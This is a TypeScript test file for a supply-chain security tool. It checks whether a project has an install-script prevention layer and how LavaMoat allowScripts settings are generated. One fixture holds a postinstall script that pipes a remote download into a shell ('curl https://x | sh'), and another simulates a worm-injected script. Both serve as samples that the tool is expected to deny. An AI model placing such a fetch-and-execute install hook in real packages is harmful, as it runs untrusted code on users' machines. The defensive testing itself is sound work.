// SPDX-License-Identifier: MIT
import { describe, expect, test } from "bun:test";
import { mkdtempSync, mkdirSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { preventionLayerCheck } from "../src/prevention";
import { emitAllowScripts } from "../src/emit-allow-scripts";
import type { InstalledPackage } from "../src/inventory";
import { scriptSha256 } from "../src/corpus/allowlist";

function tmp(): string {
  return mkdtempSync(join(tmpdir(), "wg-prev-"));
}

describe("WG-NO-PREVENTION-LAYER advisory", () => {
  test("no lockfile → no advisory (project might not even install deps)", () => {
    const dir = tmp();
    const r = preventionLayerCheck(dir, false);
    expect(r.finding).toBeNull();
  });

  test("lockfile present, no prevention layer → emit WG-NO-PREVENTION-LAYER (low)", () => {
    const dir = tmp();
    writeFileSync(join(dir, "package.json"), JSON.stringify({ name: "p", dependencies: { lodash: "1.0.0" } }));
    const r = preventionLayerCheck(dir, true);
    expect(r.finding?.ruleId).toBe("WG-NO-PREVENTION-LAYER");
    expect(r.finding?.severity).toBe("low");
  });

  test("@lavamoat/allow-scripts in devDependencies → no advisory", () => {
    const dir = tmp();
    writeFileSync(
      join(dir, "package.json"),
      JSON.stringify({ name: "p", devDependencies: { "@lavamoat/allow-scripts": "^3.0.0" } }),
    );
    const r = preventionLayerCheck(dir, true);
    expect(r.finding).toBeNull();
    expect(r.layers.lavamoat).toBe(true);
  });

  test("ignore-scripts=true in .npmrc → no advisory", () => {
    const dir = tmp();
    writeFileSync(join(dir, "package.json"), JSON.stringify({ name: "p" }));
    writeFileSync(join(dir, ".npmrc"), "ignore-scripts=true\nregistry=https://registry.npmjs.org/\n");
    const r = preventionLayerCheck(dir, true);
    expect(r.finding).toBeNull();
    expect(r.layers.npmIgnoreScripts).toBe(true);
  });

  test("enableScripts: false in .yarnrc.yml → no advisory", () => {
    const dir = tmp();
    writeFileSync(join(dir, "package.json"), JSON.stringify({ name: "p" }));
    writeFileSync(join(dir, ".yarnrc.yml"), "enableScripts: false\nnodeLinker: node-modules\n");
    const r = preventionLayerCheck(dir, true);
    expect(r.finding).toBeNull();
    expect(r.layers.yarnDisabled).toBe(true);
  });

  test("pnpm onlyBuiltDependencies present → no advisory", () => {
    const dir = tmp();
    writeFileSync(
      join(dir, "package.json"),
      JSON.stringify({ name: "p", pnpm: { onlyBuiltDependencies: ["esbuild"] } }),
    );
    const r = preventionLayerCheck(dir, true);
    expect(r.finding).toBeNull();
    expect(r.layers.pnpmTrust).toBe(true);
  });

  test("lavamoat.allowScripts already configured → no advisory", () => {
    const dir = tmp();
    writeFileSync(
      join(dir, "package.json"),
      JSON.stringify({ name: "p", lavamoat: { allowScripts: { esbuild: true } } }),
    );
    const r = preventionLayerCheck(dir, true);
    expect(r.finding).toBeNull();
    expect(r.layers.lavamoat).toBe(true);
  });
});

const inst = (name: string, scripts: Record<string, string>): InstalledPackage => ({
  name,
  version: "1.0.0",
  dir: `/x/${name}`,
  scripts,
  layout: "npm",
});

describe("emitAllowScripts (LavaMoat config bridge)", () => {
  test("packages without lifecycle scripts are NOT included", () => {
    const r = emitAllowScripts([inst("lodash", {})]);
    expect(r.allowScripts).toEqual({});
  });

  test("unknown package with lifecycle script defaults to DENY", () => {
    const r = emitAllowScripts([inst("evil-pkg", { postinstall: "curl https://x | sh" })]);
    expect(r.allowScripts["evil-pkg"]).toBe(false);
    expect(r.rationale[0]?.reason).toContain("default");
  });

  test("user-supplied fingerprint that matches → ALLOW", () => {
    const body = "node install.js";
    const sha = scriptSha256(body);
    const r = emitAllowScripts([inst("my-pkg", { postinstall: body })], {
      scriptFingerprints: { "my-pkg": [sha] },
    });
    expect(r.allowScripts["my-pkg"]).toBe(true);
    expect(r.rationale[0]?.reason).toContain("known-good");
  });

  test("known package with fingerprint drift → DENY (worm-injection)", () => {
    // 'esbuild' is in the bundled allowlist; an unknown body triggers drift.
    const r = emitAllowScripts([inst("esbuild", { postinstall: "node EVIL.js" })]);
    expect(r.allowScripts["esbuild"]).toBe(false);
    expect(r.rationale.find((x) => x.package === "esbuild")?.reason).toContain("drift");
  });

  test("output is sorted by package name (stable)", () => {
    const r = emitAllowScripts([
      inst("zzz", { postinstall: "x" }),
      inst("aaa", { postinstall: "y" }),
      inst("mmm", { postinstall: "z" }),
    ]);
    expect(Object.keys(r.allowScripts)).toEqual(["aaa", "mmm", "zzz"]);
  });
});
